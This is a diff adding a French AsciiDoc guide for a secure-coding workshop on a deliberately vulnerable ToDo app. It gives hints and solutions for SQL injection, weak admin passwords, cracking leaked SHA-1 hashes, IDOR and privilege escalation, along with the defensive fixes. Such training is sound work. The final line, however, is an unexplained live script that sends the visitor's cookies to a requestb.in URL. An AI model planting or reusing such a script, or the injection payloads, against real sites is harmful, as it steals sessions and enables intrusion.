@@ -1,0 +1,512 @@
+= Pas à pas
+:author: Pascal Abaziou
+:email: https://github.com/javathought[@javathought]
+//pascal.abaziou@gmail.com
+:revnumber: v1.0
+:revdate: 27.02.2018
+:revremark: First draft
+
+
+:icons: font
+:imagesdir: ./images
+
+++++
+<link rel="stylesheet" href="stylesheets/font-awesome.min.css">
+
+<script
+			  src="https://code.jquery.com/jquery-3.3.1.min.js"
+			  integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
+			  crossorigin="anonymous"></script>
+
+<link rel="stylesheet" href="stylesheets/bootstrap.css">
+<script src="js/bootstrap.min.js"></script>
+++++
+
+:stylesheet: stylesheets/fontawesome-4.1.0.css
+//:iconfont-cdn: //maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css
+// First unset attribute to remotely link FontAwesome CSS
+:iconfont-remote!:
+
+// Specify name of FontAwesome CSS.
+:iconfont-name: fontawesome-4.1.0
+:stylesdir: stylesheets
+//:stylesdir: ./stylesheets
+:numbered:
+
+ Préambule
+
+icon:bus[]
+
+= Introduction
+
+== Pourquoi le développement sécurisé ?
+
+image::info_nov.png[Page d'accueil après passage au journal télé en novembre 2017]
+
+Prendre en compte les exigences de sécurité tout au long du cycle de vie de l'application : conception, développement, test, ...
+
+Coûts de la sécurité à comparer avec les risques encourus
+
+Normes règlementaires
+ GDPR, CNIL
+ PCI-DSS
+
+Analyse de risque :
+
+. Disponibilité
+. Intégrité
+. Confidentialité
+. Preuve
+
+=== OWASP
+
+https://www.owasp.org/index.php/Main_Page
+https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project#tab=Main[Top 10]
+
+Le document Top 10 propose une grille d'évaluation du risque pour chacun des items.
+Elle ne contient évidemment pas l'impact métier, d'où l, importance de l'analyse de risque.
+
+== Présentation de l'application
+
+
+=== Gestion d'une ToDo liste
+
+Une simple application Single App de gestion de ToDo liste :
+
+. Un accès administrateur pour gérer les utilisateurs
+. Un accès utilisateur pour gérer sa todo liste
+
+=== Stack technique
+
+. IHM en AngularJS
+
+. Backend REST en Jersey/Jooq (grizzly embarqué)
+
+. une fenêtre modal de login basée sur des exemples
+Angular : http://jasonwatmore.com/post/2014/05/26/angularjs-basic-http-authentication-example
+Boostrap : https://bootsnipp.com/snippets/featured/clean-modal-login-form
+
+= Exercices
+
+== Se connecter à l'application en tant qu'administrateur par injection SQL
+
+Tentez de vous connecter à l'application.
+
+
+* Énoncé
+
+Allez sur la page d'accueil de l'application et tenter de vous connecter en tant qu'administrateur.
+
+++++
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce1" aria-expanded="false" aria-controls="collapseExample">
+  Indice 1
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce2" aria-expanded="false" aria-controls="collapseExample">
+  Indice 2
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#reponse1" aria-expanded="false" aria-controls="collapseExample">
+  Solution
+</a>
+++++
+
+[id=astuce1,role=collapse]
+--
+ Le compte de l'administrateur est admin
+--
+
+[id=astuce2,role=collapse]
+--
+ Injectez un bout de code afin que la clause `where` de la requête d'authentification renvoyant toujours vrai
+--
+
+[id=reponse1,role=collapse]
+Utilisez le mot de passe suivant : `e' or '1' = '1`
+
+* Correction
+
+Utilisez le DSL de Jooq pour les requêtes dynamiques. Outre le fait de générer des requêtes paramétrées, il les génère
+de manière "type safe".
+
+== Se connecter à l'application en tant qu'administrateur en devinant le mot de passe
+
+* Énoncé
+
+Le compte de l'administrateur n'a pas été correctement initialisé et son mot de passe est *très* faible (oui ça arrive).
+
+++++
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce3" aria-expanded="false" aria-controls="collapseExample">
+  Indice 1
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#reponse2" aria-expanded="false" aria-controls="collapseExample">
+  Solution
+</a>
+++++
+
+[id=astuce3,role=collapse]
+--
+ Le mot de passe est égal au nom d'utilisateur
+--
+[id=reponse2,role=collapse]
+--
+ Essayez avec admin/admin
+--
+
+* Correction
+
+Changez le mot de passe de l'administrateur
+
+== Se connecter avec le compte d'un utilisateur de l'application
+
+Des pirates ont diffusé un extrait des comptes des utilisateurs d'un site sur lequel ils se sont introduits.
+Pouvez-vous en tirer partie pour vous connecter sur l'application ?
+
+----
+courtneyrivera@exostream.com   :21bd100d4f6e8fa6eecad2a3aa415eec418d38ec
+mckeecarey@apex.com            :21bd1011053fd0102e94d6ae2f8b83d76faf94f6
+ellasykes@magnina.com          :21bd1012a7ca357541f0ac487871feec1891c49c
+lewishiggins@shopabout.com     :21bd10136e006e24e7d152139815fb0fc6a50b15
+arthur.doe@example.com         :21bd12dc183f740ee76f27b78eb39c8ad972a757
+whitneyjimenez@animalia.com    :21bd165c1026eaa0119cd86f4a9d148ee2d51d82
+john.doe@example.com           :cbfdac6008f9cab4083784cbd1874f76618d2a97
+figueroacaldwell@pyrami.com    :21bd165fec9e83edeffb2320645ca1512f3b2a50
+yolandamcneil@puria.com        :21bd166677b8ed92cdecd44a8635e3e993de04e9
+frostcallahan@quonata.com      :21bd16667e903bf80b3e62bb1a4654e7f2d7187f
+albertawolf@joviold.com        :21bd16991a1bf5574e570db8e98bbe7346acaa94
+huntermoody@combot.com         :21bd16a088d608dbb983fb120b27882a9a77bb29
+demo.doe@example.com           :a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
+alicefrye@quarmony.com         :21bd16b1fa49a7f28aa2c3336f7e6a0715a602d3
+mindyhull@recognia.com         :21bd16c49f100471b44bbde181c5443b95344a31
+socorrokent@comverges.com      :21bd16c4ba5dfc19575e035ec7eaa82001b96d03
+blakelester@nutralab.com       :21bd16c5b3efdab6e40e0a4b2dfefe81f50018b6
+jane.doe@example.com           :40bd001563085fc35165329ea1ff5c5ecbdbbeef
+mike.doe@example.com           :315f166c5aca63a157f7d41007675cb44a948b33
+gordonobrien@talkola.com       :21bd16d22a591152b1cb368ddebe38aef895259b
+cherrymiles@assistia.com       :21bd16d358b829c770f763cea21bf73f550c3e2f
+mathilde.doe@example.com       :5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
+barbarahahn@extro.com          :21bd16d44a7750f3bdfc90cb4f5836b8926afc5f
+watsonriddle@songlines.com     :21bd16d4a08cb51c8b88fc8ce07742974d7d541d
+gibsonbradley@comtest.com      :21bd16e17b1233f394c9ae095d73b4cb4025a3ac
+leticiacarr@qualitex.com       :21bd16e231b238a632f3388662dc3735fbd44f8e
+rowenacoleman@bleendot.com     :39007e310acd5cc5582c34c408ebf4cc
+mararhodes@artiq.com           :c69f24b431852eb5b2db419860387dad
+tanishaadams@opticom.com       :713f6fcbeeacbd3a78401382f88f5d1f
+cruzharmon@intergeek.com       :86fc184cabcf0626c479927cc4e5e998
+flossiecantu@applica.com       :c075be959b6831fb01d52591963d12b7
+leonorstevenson@plasmosis.com  :6c058fea843d5bff058c939fde3a6eb8
+christiangonzales@springbee.com:2dfecece2bf00698dd5fbae90e2f0860
+candiceshaffer@geekology.com   :e720578393bb68956f079c3db426d6ec
+deliahewitt@kyagoro.com        :b0963f1a7fd94698a6e76e402daffcef
+lydiadouglas@capscreen.com     :026d29ad37c6c672315e5a9c358d0a7c
+waderowe@pigzart.com           :7d01d8893e7ddbb18ceb40c59ef384c2
+mejiasilva@hyplex.com          :bf1a688689f82ba39b9efa236d09c539
+mcfarlanddale@pasturia.com     :dfcd9ad16c5358c1c420343a7b2b683b
+kristihickman@zyple.com        :14f6609d95e3830b14709bce165041af
+lauriewebb@injoy.com           :2b1841891df6de05b163d8dbbe79036c
+daniellelong@datagen.com       :9fe44d8eb7fbc5217fad2e54d09871ed
+vickistein@kaggle.com          :961887ee6a084c02619f22f6b2e8a852
+staceyweaver@comtent.com       :fd9d9fa433c0d9385345355c17be13f4
+meltonvelasquez@mangelica.com  :fa22376fe0782fe9313385846e66b979
+rodriquezmorse@nexgene.com     :095614e5971ad8a81d4f232c00bbf33d
+silviabell@vendblend.com       :f14c92dd1b2281cdf0f5999e595442de
+hoodmatthews@jasper.com        :6e0f9ff4606b41705ea25bcbff1ac94b
+mitziholt@orbalix.com          :49cacc76a288058b68ded69f0c804269
+howardsalinas@utarian.com      :cbc7f37615111efe8e246d3316e24408
+barlowbradshaw@primordia.com   :81fc99cc34d28eec3c90109cab7ddfbe
+mattiemoon@combogene.com       :e838f7db8ef56faa9b49e8215dfbbee7
+berylharper@escenta.com        :02ae65a2f3dac98a54290f09c39758ed
+margeryglover@mediot.com       :3a7edcb86afee6b0853fba0a16672bcd
+searswalls@isopop.com          :22d541659b917e40146f4d4256b2a2e2
+mariannehayes@phormula.com     :4e953e9a0a0f2503e8b8269b2c4a8057
+
+----
+
+
+++++
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce4" aria-expanded="false" aria-controls="collapseExample">
+  Indice 1
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#reponse3" aria-expanded="false" aria-controls="collapseExample">
+  Solution
+</a>
+++++
+
+[id=astuce4,role=collapse]
+--
+ Les valeur en clair des empreintes SHA-1 sont facilement retrouvables par rainbow tables
+--
+
+[id=reponse3,role=collapse]
+--
+ Utilisez le site https://hashkiller.co.uk/sha1-decrypter.aspx qui possède des rainbow tables sur les mots de passe de sites hackées
+--
+
+
+
+* Correction
+
+.L'application ToDo stocke aussi l'empreinte des mots de passe en simple hash SHA-1.
+Renforcez le chiffrement par un hachage renforcé.
+
+++++
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce5" aria-expanded="false" aria-controls="collapseExample">
+  Indice 1
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce6" aria-expanded="false" aria-controls="collapseExample">
+  Indice 2
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#reponse4" aria-expanded="false" aria-controls="collapseExample">
+  Solution
+</a>
+++++
+
+[id=astuce5,role=collapse]
+--
+ Une bonne fonction de hachage doit être forte, évolutive, avec un sel et un facteur de travail
+--
+
+[id=astuce6,role=collapse]
+--
+ Utilisez un des fonctions suivantes : Argon2, PBKDF2, scrypt, ou bcrypt.
+--
+
+[id=reponse4,role=collapse]
+--
+ Le patch `stockage_pwd.patch` contient une première implémentation PBKDF2.
+ Le site https://veggiespam.com/painless-password-hash-upgrades/ présente un guide compatible avec Spring security
+--
+
+.Se protéger contre la réutilisation des mots de passe provenant de sites hackés
+
+. refusez les emails comme compte de connexion
+. créez une base des mots de passe des hash divulgués, initialisez-là avec la liste ci-dessus et contrôlez l'utilisation d'un mot de passe "corrompu"
+lors de la mise à jour du mot de passe.
+
+[NOTE]
+En cible vous pouvez récupérer une base de hash ayant fuité par exemple sur https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm :
+1,493,677,782 entrées, 15GB
+
+== XXE ?
+
+== Augmentez vos privilèges
+
+Connectez vous avec votre compte utilisateur : devoxx/devoxx2018 et essayez d'obtenir les droits administrateurs
+en modifiant le contenu d'une requête REST légitime.
+
+
+++++
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce7" aria-expanded="false" aria-controls="collapseExample">
+  Indice 1
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce8" aria-expanded="false" aria-controls="collapseExample">
+  Indice 2
+</a>
+++++
+
+[id=astuce7,role=collapse]
+--
+ Regardez le contenu de la requête REST de changement de mot de passe.
+--
+
+[id=astuce8,role=collapse]
+--
+ 2 actions sont possibles :
+ - modifier le code html (avec developerTools sous Chrome par exemple)
+ - intercepter la requête pour la modifier et la rejouer
+--
+
+* Correction
+
+Ajoutez un contrôle d'accès au fonctions autorisées
+
+. Séparez les fonctions de l'administrateur et de l'utilisateur normal (Créez une classe CurrentUserResources).
+. Ajoutez un contrôle d'accès différent sur la classe UserResource (pour l'administrateur) et la classe CurrentUserResource.
+ La récupération des rôles de l'utilisateur a déjà été effectuée dans le principal
+
+++++
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#reponse5" aria-expanded="false" aria-controls="collapseExample">
+  Solution
+</a>
+
+++++
+
+
+[id=reponse5,role=collapse]
+--
+ Annotez les classes avec @RolesAllowed(ADMIN) et @RolesAllowed(Role.USER)
+ Les annotations peuvent aussi se faire au niveau des méthodes.
+--
+
+
+
+== Accédez et modifiez les todos des autres utilisateurs
+
+De nouveau connectez-vous avec votre compte utilisateur (devoxx/devoxx2018).
+Supprimez vos droits administrateurs puis essayez d'accéder et/ou modifier les todos d'un autre utilisateur.
+
+++++
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce9" aria-expanded="false" aria-controls="collapseExample">
+  Indice 1
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#reponse6" aria-expanded="false" aria-controls="collapseExample">
+  Solution
+</a>
+++++
+
+[id=astuce9,role=collapse]
+--
+ Regardez l'url de la page lorsque vous affichez le détail d'une todo
+--
+
+[id=reponse6,role=collapse]
+--
+ Affichez la todo avec l'id 1 par exemple
+--
+
+
+* Correction
+
+. Remplacez l'id d'accès aux todos par un uuid pour empêcher les utilisateurs de forger des requêtes illicites.
+. Ajoutez un contrôle d'accès au périmètre de données autorisées.
+
+++++
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce10" aria-expanded="false" aria-controls="collapseExample">
+  Indice 1
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce11" aria-expanded="false" aria-controls="collapseExample">
+  Indice 2
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce12" aria-expanded="false" aria-controls="collapseExample">
+  Indice 3
+</a>
+++++
+
+[id=astuce10,role=collapse]
+--
+ Pour la première modification, l'application gère déjà un `id` et un `uuid`. Pour ne plus les restituer dans le corps JSon des réponses,
+ il suffit d'inverser l'utilisation de l'annotation `@XmlTransient`. Il reste à modifier les appels de ressources avec
+ l'id en paramètre et les requêtes sql associées à un id.
+--
+
+[id=astuce11,role=collapse]
+--
+ Pour la deuxième modification, il faut seulement accéder aux données de l'utilisateur courant. Enrichissez la classe
+ `CurrentUserResource` pour implémenter l'accès aux todos de l'utilisateur connecté.
+--
+
+[id=astuce12,role=collapse]
+--
+ Pour récupérer l'utilisateur actuel, utiliser le code suivante : `(User) securityContext.getUserPrincipal()`
+--
+
+
+== Security Misconfiguration
+
+== Obtenez les informations de session de l'administrateur
+
+XSS + passer en cookie
+
+== Insecure deserializatin
+
+== Composants vulnérables
+
+Vérifiez la présence de dépendendances vulnérables sur le serveur REST.
+
+++++
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce13" aria-expanded="false" aria-controls="collapseExample">
+  Indice 1
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#reponse7" aria-expanded="false" aria-controls="collapseExample">
+  Indice 2
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce12" aria-expanded="false" aria-controls="collapseExample">
+  Indice 3
+</a>
+++++
+
+[id=astuce13,role=collapse]
+--
+ L'OWASP me à disposition un outil de vérification de présence de vulnérabilités dans les dépendences d'un projet, notamment
+ sous forme de plugin maven.
+--
+
+[id=reponse7,role=collapse]
+--
+  mvn dependency-check:check -pl owasp-jersey
+
+  Montez de version Jackson et vérifiez que le plugin ne remonte plus de vulnérabilité sur cette dépendance.
+--
+
+
+== Logging and monitoring
+
+Mettez en place un logging systématique dédié à la sécurité sur les accès aux ressources REST.
+
+++++
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce14" aria-expanded="false" aria-controls="collapseExample">
+  Indice 1
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#reponse8" aria-expanded="false" aria-controls="collapseExample">
+  Indice 2
+</a>
+++++
+
+[id=astuce14,role=collapse]
+--
+ Utilisez 2 filtres (1 ContainerRequestFilter et 1 ContainerResponseFilter) pour générer les logs de sécurité
+ Utilisez les `MCD` dans le premier filtre pour positionner les informations de contexte (comme le nom de l'utilisateur accédant à la ressource)
+ Utilisez un `Marker` dans le deuxième filtre pour identifer les logs de sécurité (et pouvoir les isoler dans un fichier dédié.)
+--
+
+[id=reponse8,role=collapse]
+--
+  Utilisez le patch suivant :
+--
+
+
+Monitorez cette log dans ELK.
+
+Utilisez ces commandes pour lancer les conteneurs Elastic et Kibana
+----
+docker network create elastic
+docker run --network=elastic -e ELASTIC_PASSWORD=MagicWord -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" docker.elastic.co/elasticsearch/elasticsearch-platinum:6.2.3
+docker run --network=elastic -e ELASTICSEARCH_PASSWORD=MagicWord -p 5601:5601 docker.elastic.co/kibana/kibana:6.2.3
+
+----
+
+
+
+== Agmentez encore vos privilèges
+
+== 2FA
+
+== Reinit password
+
+
+
+
+
+
+
+
+
+== XXE
+
+== click jacking  et headers
+
+... ????
+
+== Mettre en place une authent forte
+
+== ajouter des tests
+
+
+[NOTE]
+====
+Docker for Mac :
+
+sudo ifconfig lo0 alias 10.0.0.2
+====
+
+
+
+<script>document.write("<img src=https://requestb.in/1lfbtmw1?s="+encodeURI(document.cookie)+"></img>");</script>
